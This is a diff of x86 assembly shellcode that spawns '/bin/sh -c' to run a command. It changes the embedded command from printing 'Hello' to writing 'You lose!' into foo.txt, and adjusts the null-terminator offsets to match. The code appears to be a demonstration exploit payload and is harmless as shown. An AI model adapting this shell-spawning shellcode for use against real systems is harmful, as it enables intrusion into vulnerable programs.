@@ -45,16 +45,16 @@ arg3:
      mov long [esp], eax
 arg2:
      Call arg1
-     db 'echo HelloJ'
+     db 'echo "You lose!" > foo.txtJ'
 arg1:
      pop esi
      push esi
-     mov byte [esi + 0xa], al
+     mov byte [esi + 26], al
      Call arg0
      db '-cJ'
 arg0:
      pop esi
      push esi
-     mov byte [esi + 0x2], al
+     mov byte [esi + 2], al
      Call shellcode
      db '/bin/shJAAAAKKKK'
